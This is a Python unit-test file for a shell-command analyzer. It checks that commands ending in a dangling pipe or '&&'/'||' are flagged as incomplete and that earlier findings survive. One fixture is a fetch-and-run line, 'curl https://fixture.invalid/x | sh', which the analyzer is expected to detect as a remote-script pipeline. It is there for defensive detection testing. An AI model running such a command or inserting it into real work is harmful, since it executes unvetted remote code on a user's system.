"""Mutation guard for incomplete shell continuation and its benign twins.

Pure lexical fixtures: the inputs are never executed or connected to a host.
Deleting the trailing-operator limitation in shell_syntax._run must fail here.
"""
from __future__ import annotations

import unittest

from falsicore import shell_syntax


class ShellContinuationCompleteness(unittest.TestCase):
    def test_terminal_pipeline_and_boolean_operators_are_incomplete(self):
        for operator in ("|", "&&", "||"):
            with self.subTest(operator=operator):
                result = shell_syntax.analyze(f"printf safe {operator}")
                self.assertIn("INCOMPLETE_CONTINUATION", result["limitations"])

    def test_completed_commands_are_benign_twins(self):
        for source in ("printf safe", "printf safe;", "printf safe | cat",
                       "printf safe && true", "printf safe || true"):
            with self.subTest(source=source):
                result = shell_syntax.analyze(source)
                self.assertNotIn("INCOMPLETE_CONTINUATION", result["limitations"])

    def test_incomplete_suffix_does_not_discard_previous_findings(self):
        result = shell_syntax.analyze("curl https://fixture.invalid/x | sh; printf safe &&")
        self.assertIn("REMOTE_SCRIPT_PIPELINE", result["patterns"])
        self.assertIn("INCOMPLETE_CONTINUATION", result["limitations"])


if __name__ == "__main__":
    unittest.main()
